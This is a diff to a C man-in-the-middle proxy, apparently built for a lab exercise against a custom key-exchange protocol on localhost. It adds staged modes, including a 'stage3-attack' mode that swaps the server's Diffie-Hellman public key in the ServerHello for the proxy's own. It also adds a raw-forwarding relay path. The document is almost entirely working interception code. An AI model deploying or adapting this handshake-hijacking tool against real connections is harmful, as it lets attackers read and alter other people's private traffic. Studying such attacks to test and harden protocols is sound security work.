@@ -82,6 +82,8 @@ struct mitm_ctx {
 	uint8_t key_server[32];
 	uint32_t salt;
 
+	int raw_forward;
+
 	int switch_pending;
 	uint8_t next_key_client[32];
 	uint8_t next_key_server[32];
@@ -92,6 +94,17 @@ struct mitm_ctx {
 
 	struct rekey_pending pending;
 };
+
+static int relay_raw_one(int from_fd, int to_fd) {
+	void *buf = NULL;
+	uint32_t len = 0;
+	if (net_recv_frame(from_fd, &buf, &len) != 0) {
+		return -1;
+	}
+	int rc = net_send_frame(to_fd, buf, len);
+	net_free_frame(buf);
+	return rc;
+}
 
 static int decrypt_frame(const uint8_t key[32], const uint8_t *frame, uint32_t frame_len, uint8_t *out_type, uint64_t *out_seq,
 						 const uint8_t **out_iv, const uint8_t **out_tag, const uint8_t **out_ct, uint32_t *out_ct_len,
@@ -292,7 +305,14 @@ static int relay_one(struct mitm_ctx *ctx, int from_fd, int to_fd, const uint8_t
 	return rc;
 }
 
-static int do_handshake(struct mitm_ctx *ctx, int client_fd, int server_fd) {
+enum mode {
+	MODE_AUTO = 0,
+	MODE_STAGE1 = 1,
+	MODE_STAGE3_PASSIVE = 2,
+	MODE_STAGE3_ATTACK = 3,
+};
+
+static int do_handshake(struct mitm_ctx *ctx, int client_fd, int server_fd, enum mode mode) {
 	void *cbuf = NULL;
 	uint32_t clen = 0;
 	if (net_recv_frame(client_fd, &cbuf, &clen) != 0) {
@@ -315,17 +335,23 @@ static int do_handshake(struct mitm_ctx *ctx, int client_fd, int server_fd) {
 	uint8_t pub_to_server[32];
 	uint8_t priv_to_client[32];
 	uint8_t pub_to_client[32];
-	if (crypto_dh_keypair(priv_to_server, pub_to_server) != 0) {
-		net_free_frame(cbuf);
-		return -1;
-	}
-	if (crypto_dh_keypair(priv_to_client, pub_to_client) != 0) {
-		net_free_frame(cbuf);
-		return -1;
+	int have_mitm_keys = 0;
+	if (mode == MODE_AUTO || mode == MODE_STAGE1 || mode == MODE_STAGE3_ATTACK) {
+		if (crypto_dh_keypair(priv_to_server, pub_to_server) != 0) {
+			net_free_frame(cbuf);
+			return -1;
+		}
+		if (crypto_dh_keypair(priv_to_client, pub_to_client) != 0) {
+			net_free_frame(cbuf);
+			return -1;
+		}
+		have_mitm_keys = 1;
 	}
 
 	cp[0] = MSG_CLIENT_HELLO;
-	memcpy(&cp[1 + 16], pub_to_server, 32);
+	if (have_mitm_keys && (mode == MODE_AUTO || mode == MODE_STAGE1 || mode == MODE_STAGE3_ATTACK)) {
+		memcpy(&cp[1 + 16], pub_to_server, 32);
+	}
 	if (net_send_frame(server_fd, cp, clen) != 0) {
 		net_free_frame(cbuf);
 		return -1;
@@ -337,15 +363,48 @@ static int do_handshake(struct mitm_ctx *ctx, int client_fd, int server_fd) {
 	if (net_recv_frame(server_fd, &sbuf, &slen) != 0) {
 		return -1;
 	}
-	if (slen != (1 + 16 + 32)) {
-		net_free_frame(sbuf);
-		return -1;
-	}
 	uint8_t *sp = (uint8_t *)sbuf;
 	if (sp[0] != MSG_SERVER_HELLO) {
 		net_free_frame(sbuf);
 		return -1;
 	}
+
+	if (slen == (1 + 16 + 32 + 32)) {
+		if (mode == MODE_STAGE1) {
+			net_free_frame(sbuf);
+			return -1;
+		}
+		memcpy(ctx->n_s, &sp[1], 16);
+		ctx->raw_forward = 1;
+
+		if (mode == MODE_STAGE3_ATTACK || mode == MODE_AUTO) {
+			if (!have_mitm_keys) {
+				net_free_frame(sbuf);
+				return -1;
+			}
+			memcpy(&sp[1 + 16], pub_to_client, 32);
+			fprintf(stdout, "stage3 attack injected\n");
+			fflush(stdout);
+		}
+
+		if (net_send_frame(client_fd, sp, slen) != 0) {
+			net_free_frame(sbuf);
+			return -1;
+		}
+		net_free_frame(sbuf);
+		return 0;
+	}
+
+	if (slen != (1 + 16 + 32)) {
+		net_free_frame(sbuf);
+		return -1;
+	}
+
+	if (mode == MODE_STAGE3_PASSIVE || mode == MODE_STAGE3_ATTACK) {
+		net_free_frame(sbuf);
+		return -1;
+	}
+
 	memcpy(ctx->n_s, &sp[1], 16);
 	uint8_t pub_s[32];
 	memcpy(pub_s, &sp[1 + 16], 32);
@@ -370,7 +429,9 @@ static int do_handshake(struct mitm_ctx *ctx, int client_fd, int server_fd) {
 }
 
 static void usage(const char *prog) {
-	fprintf(stderr, "Usage: %s --listen <ip> --lport <port> --target <ip> --tport <port>\n", prog);
+	fprintf(stderr,
+			"Usage: %s --listen <ip> --lport <port> --target <ip> --tport <port> [--mode auto|stage1|stage3-passive|stage3-attack]\n",
+			prog);
 }
 
 int main(int argc, char **argv) {
@@ -378,17 +439,19 @@ int main(int argc, char **argv) {
 	uint16_t listen_port = 9001;
 	const char *target_host = "127.0.0.1";
 	uint16_t target_port = 9000;
+	enum mode mode = MODE_AUTO;
 
 	static struct option opts[] = {
 		{"listen", required_argument, 0, 'l'},
 		{"lport", required_argument, 0, 'L'},
 		{"target", required_argument, 0, 't'},
 		{"tport", required_argument, 0, 'T'},
+		{"mode", required_argument, 0, 'm'},
 		{0, 0, 0, 0},
 	};
 
 	for (;;) {
-		int c = getopt_long(argc, argv, "l:L:t:T:", opts, NULL);
+		int c = getopt_long(argc, argv, "l:L:t:T:m:", opts, NULL);
 		if (c == -1) {
 			break;
 		}
@@ -407,6 +470,20 @@ int main(int argc, char **argv) {
 			break;
 		case 'T':
 			if (util_parse_u16(optarg, &target_port) != 0) {
+				usage(argv[0]);
+				return 2;
+			}
+			break;
+		case 'm':
+			if (strcmp(optarg, "auto") == 0) {
+				mode = MODE_AUTO;
+			} else if (strcmp(optarg, "stage1") == 0) {
+				mode = MODE_STAGE1;
+			} else if (strcmp(optarg, "stage3-passive") == 0) {
+				mode = MODE_STAGE3_PASSIVE;
+			} else if (strcmp(optarg, "stage3-attack") == 0) {
+				mode = MODE_STAGE3_ATTACK;
+			} else {
 				usage(argv[0]);
 				return 2;
 			}
@@ -438,7 +515,7 @@ int main(int argc, char **argv) {
 
 		struct mitm_ctx ctx;
 		memset(&ctx, 0, sizeof(ctx));
-		if (do_handshake(&ctx, client_fd, server_fd) != 0) {
+		if (do_handshake(&ctx, client_fd, server_fd, mode) != 0) {
 			close(client_fd);
 			close(server_fd);
 			continue;
@@ -456,13 +533,25 @@ int main(int argc, char **argv) {
 				break;
 			}
 			if (pfds[0].revents & POLLIN) {
-				if (relay_one(&ctx, client_fd, server_fd, ctx.key_client, ctx.key_server, "C->S", 1) != 0) {
-					break;
+				if (ctx.raw_forward) {
+					if (relay_raw_one(client_fd, server_fd) != 0) {
+						break;
+					}
+				} else {
+					if (relay_one(&ctx, client_fd, server_fd, ctx.key_client, ctx.key_server, "C->S", 1) != 0) {
+						break;
+					}
 				}
 			}
 			if (pfds[1].revents & POLLIN) {
-				if (relay_one(&ctx, server_fd, client_fd, ctx.key_server, ctx.key_client, "S->C", 0) != 0) {
-					break;
+				if (ctx.raw_forward) {
+					if (relay_raw_one(server_fd, client_fd) != 0) {
+						break;
+					}
+				} else {
+					if (relay_one(&ctx, server_fd, client_fd, ctx.key_server, ctx.key_client, "S->C", 0) != 0) {
+						break;
+					}
 				}
 			}
 		}
